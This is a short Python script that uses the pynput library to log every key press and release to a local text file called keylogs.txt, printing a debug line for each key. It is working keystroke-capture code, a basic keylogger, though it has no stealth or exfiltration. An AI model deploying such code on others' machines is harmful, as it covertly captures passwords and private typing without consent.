import pynput
from pynput import keyboard
import os

# Define the path to the keylogs file
keylogs_file = 'keylogs.txt'

def on_press(key):
    try:
        # Append the pressed key to the log file
        with open(keylogs_file, 'a') as f:
            f.write(str(key) + '\n')
            print(f"Key {key} pressed and logged.")  # Debug statement
    except Exception as e:
        print(f"Error logging key press: {e}")

def on_release(key):
    try:
        # Append the released key to the log file
        with open(keylogs_file, 'a') as f:
            f.write(str(key) + '\n')
            print(f"Key {key} released and logged.")  # Debug statement
    except Exception as e:
        print(f"Error logging key release: {e}")

# Create the log file if it doesn't exist
if not os.path.exists(keylogs_file):
    with open(keylogs_file, 'w') as f:
        pass

# Start listening for keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()